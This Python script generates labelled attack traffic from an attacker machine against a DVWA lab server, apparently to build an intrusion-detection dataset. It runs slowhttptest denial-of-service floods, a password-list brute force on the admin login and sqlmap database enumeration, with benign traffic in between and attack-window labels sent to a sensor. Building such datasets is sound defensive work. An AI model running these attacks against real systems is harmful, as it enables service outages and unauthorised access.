#!/usr/bin/env python3
"""
dvwa_traffic_remote.py

Run on the separate attacker Ubuntu/Kali machine.

Usage:
  sudo python3 dvwa_traffic_remote.py \
    <DVWA_IP> <SENSOR_IP> [all|dos|sqli]

Example:
  sudo python3 dvwa_traffic_remote.py \
    192.168.0.30 192.168.0.30 all
"""

from __future__ import annotations

import csv
import re
import shutil
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

if len(sys.argv) < 3:
    print(
        f"Usage: sudo python3 {sys.argv[0]} "
        "<DVWA_IP> <SENSOR_IP> "
        "[all|dos|sqli]"
    )
    sys.exit(1)

TARGET_IP = sys.argv[1]
SENSOR_IP = sys.argv[2]
PHASE = (
    sys.argv[3]
    if len(sys.argv) > 3
    else "all"
)

if PHASE not in ("all", "dos", "sqli"):
    print(
        "Error: phase must be all, dos, or sqli"
    )
    sys.exit(1)

# ============================== CONFIG ==============================
PORT = 80
DVWA_PATH = ""
USERNAME = "admin"
PASSWORD = "password"

BENIGN_COUNT = 200

DOS_S_MODE = "-H"
DOS_T_MODE = "-B"
DOS_SECONDS = 60
DOS_CONN = 1000

LABEL_EVENT_URL = (
    f"http://{SENSOR_IP}:5100/label-event"
)
HEALTH_URL = (
    f"http://{SENSOR_IP}:5100/health"
)

ATTACK_WINDOWS_FILE = Path(
    "attack_windows.csv"
)

BF_PASSWORDS = [
    "123456",
    "password",
    "admin",
    "letmein",
    "qwerty",
    "dragon",
    "111111",
    "abc123",
    "monkey",
    "root",
    "toor",
    "password123",
    "welcome",
    "login",
    "master",
    "hello",
    "passw0rd",
    "changeme",
]
# ===================================================================

BASE = (
    f"http://{TARGET_IP}:{PORT}{DVWA_PATH}"
)


def ensure_apt(
    package: str,
    command: str | None = None,
) -> None:
    if shutil.which(command or package):
        return

    print(f"[setup] installing {package}")

    subprocess.run(
        ["apt-get", "update"],
        check=False,
    )
    subprocess.run(
        ["apt-get", "install", "-y", package],
        check=True,
    )


def ensure_pip(
    module: str,
    package: str | None = None,
) -> None:
    try:
        __import__(module)
    except ImportError:
        print(
            f"[setup] installing "
            f"{package or module}"
        )

        subprocess.run(
            [
                sys.executable,
                "-m",
                "pip",
                "install",
                package or module,
                "--break-system-packages",
            ],
            check=True,
        )


def setup() -> None:
    print("[setup] checking dependencies")
    ensure_apt("slowhttptest")
    ensure_apt("sqlmap")
    ensure_pip("requests")
    print("[setup] ready")


setup()

import requests  # noqa: E402


def timestamp_text(
    moment: datetime,
) -> str:
    return moment.strftime(
        "%Y-%m-%d %H:%M:%S.%f"
    )


def initialize_attack_log() -> None:
    with ATTACK_WINDOWS_FILE.open(
        "w",
        newline="",
    ) as file:
        csv.writer(file).writerow(
            ["label", "start", "end"]
        )


def append_attack_window(
    label: str,
    start: datetime,
    end: datetime,
) -> None:
    with ATTACK_WINDOWS_FILE.open(
        "a",
        newline="",
    ) as file:
        csv.writer(file).writerow(
            [
                label,
                timestamp_text(start),
                timestamp_text(end),
            ]
        )


def check_sensor() -> None:
    try:
        response = requests.get(
            HEALTH_URL,
            timeout=3,
        )
        response.raise_for_status()

    except requests.RequestException as error:
        print(
            f"[!] sensor is unreachable: {error}"
        )
        print(
            "[!] Start sensor_pipeline.py first "
            "and check TCP/5100."
        )
        sys.exit(1)

    print(
        f"[*] sensor health OK: {HEALTH_URL}"
    )


def send_label_event(
    event: str,
    label: str,
    moment: datetime,
) -> None:
    payload = {
        "event": event,
        "label": label,
        "timestamp": timestamp_text(moment),
    }

    try:
        response = requests.post(
            LABEL_EVENT_URL,
            json=payload,
            timeout=5,
        )
        response.raise_for_status()

    except requests.RequestException as error:
        print(
            "[label] WARNING: event delivery "
            f"failed: {error}"
        )


def run_labeled_attack(
    label,
    function,
    *args,
):
    start = datetime.now()
    print(
        f"\n[label] {label} start: {start}"
    )
    send_label_event(
        "start",
        label,
        start,
    )

    try:
        return function(*args)

    finally:
        end = datetime.now()

        append_attack_window(
            label,
            start,
            end,
        )
        send_label_event(
            "end",
            label,
            end,
        )

        print(
            f"[label] {label} end: {end}"
        )


def get_csrf_token(
    response_text: str,
) -> str:
    match = re.search(
        r"name=['\"]user_token['\"]"
        r"\s+value=['\"]([0-9a-f]+)['\"]",
        response_text,
        re.IGNORECASE,
    )
    return match.group(1) if match else ""


def dvwa_session(
    force_close: bool = False,
) -> requests.Session:
    session = requests.Session()

    if force_close:
        session.headers.update(
            {"Connection": "close"}
        )

    response = session.get(
        BASE + "/login.php",
        timeout=5,
    )
    token = get_csrf_token(response.text)
    response.close()

    response = session.post(
        BASE + "/login.php",
        timeout=5,
        allow_redirects=True,
        data={
            "username": USERNAME,
            "password": PASSWORD,
            "Login": "Login",
            "user_token": token,
        },
    )
    response.close()

    session.cookies.set(
        "security",
        "low",
    )
    return session


def benign(count: int) -> None:
    print(
        f"\n[benign] generating "
        f"{count} normal flows"
    )

    pages = [
        "/index.php",
        "/vulnerabilities/sqli/"
        "?id=1&Submit=Submit",
        "/vulnerabilities/xss_r/"
        "?name=hello",
        "/security.php",
        "/vulnerabilities/brute/"
        "?username=admin&password=x"
        "&Login=Login",
    ]

    successful = 0
    failed = 0

    for index in range(1, count + 1):
        session = None

        try:
            session = dvwa_session(
                force_close=True
            )

            page = pages[
                (index - 1) % len(pages)
            ]

            response = session.get(
                BASE + page,
                timeout=5,
                headers={
                    "Connection": "close"
                },
            )

            if response.ok:
                successful += 1
            else:
                failed += 1

            response.close()

        except requests.RequestException:
            failed += 1

        finally:
            if session is not None:
                session.close()

        if index % 50 == 0:
            print(
                f"[benign] {index}/{count}"
            )

        time.sleep(0.05)

    print(
        f"[benign] done "
        f"({successful} successful, "
        f"{failed} failed)"
    )


def slowhttp(
    label: str,
    mode: str,
    url: str,
) -> None:
    print(
        f"\n[{label}] slowhttptest "
        f"{mode} -> {url}"
    )

    command = [
        "slowhttptest",
        "-c",
        str(DOS_CONN),
        mode,
        "-i",
        "10",
        "-r",
        "200",
        "-u",
        url,
        "-x",
        "24",
        "-p",
        "3",
        "-l",
        str(DOS_SECONDS),
    ]

    subprocess.run(
        command,
        check=False,
    )
    print(f"[{label}] done")


def brute_force() -> None:
    print(
        f"\n[bf] generating "
        f"{len(BF_PASSWORDS)} login attempts"
    )

    successes = 0

    for password in BF_PASSWORDS:
        session = requests.Session()
        session.headers.update(
            {"Connection": "close"}
        )

        try:
            response = session.get(
                BASE + "/login.php",
                timeout=5,
            )
            token = get_csrf_token(
                response.text
            )
            response.close()

            response = session.post(
                BASE + "/login.php",
                timeout=5,
                allow_redirects=False,
                data={
                    "username": USERNAME,
                    "password": password,
                    "Login": "Login",
                    "user_token": token,
                },
            )

            location = response.headers.get(
                "Location",
                "",
            )

            if (
                response.status_code == 302
                and "login.php"
                not in location
            ):
                print(
                    f"[bf] success: "
                    f"{USERNAME}:{password}"
                )
                successes += 1

            response.close()

        except requests.RequestException:
            pass

        finally:
            session.close()

        time.sleep(0.05)

    print(
        f"[bf] done "
        f"({successes} successful logins)"
    )


def sqli() -> None:
    print("\n[sqli] running sqlmap")

    try:
        session = dvwa_session(
            force_close=False
        )
    except requests.RequestException as error:
        print(
            f"[sqli] session error: {error}"
        )
        return

    try:
        session_id = session.cookies.get(
            "PHPSESSID"
        )

        if not session_id:
            print(
                "[sqli] PHPSESSID not found"
            )
            return

        cookie = (
            f"PHPSESSID={session_id}; "
            f"security=low"
        )
        target = (
            BASE
            + "/vulnerabilities/sqli/"
            + "?id=1&Submit=Submit"
        )

        command = [
            "sqlmap",
            "-u",
            target,
            "--cookie",
            cookie,
            "--batch",
            "--dbs",
            "--level=2",
            "--risk=2",
            "--flush-session",
        ]

        subprocess.run(
            command,
            check=False,
        )
        print("[sqli] done")

    finally:
        session.close()


def run_dos_phase() -> None:
    benign(BENIGN_COUNT)

    run_labeled_attack(
        "dos-s",
        slowhttp,
        "dos-s",
        DOS_S_MODE,
        BASE + "/",
    )

    benign(BENIGN_COUNT)

    run_labeled_attack(
        "dos-t",
        slowhttp,
        "dos-t",
        DOS_T_MODE,
        BASE + "/login.php",
    )

    benign(BENIGN_COUNT)

    run_labeled_attack(
        "bf",
        brute_force,
    )


def run_sqli_phase() -> None:
    benign(BENIGN_COUNT)

    run_labeled_attack(
        "sqli",
        sqli,
    )


def main() -> None:
    initialize_attack_log()
    check_sensor()

    print(f"[*] target={BASE}")
    print(f"[*] phase={PHASE}")
    print(
        f"[*] label receiver="
        f"{LABEL_EVENT_URL}"
    )

    if PHASE in ("all", "dos"):
        run_dos_phase()

    if PHASE in ("all", "sqli"):
        run_sqli_phase()

    benign(BENIGN_COUNT)

    print(
        "\n[+] all traffic generation done"
    )
    print(
        f"[+] local attack windows: "
        f"{ATTACK_WINDOWS_FILE}"
    )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] interrupted")
        sys.exit(130)
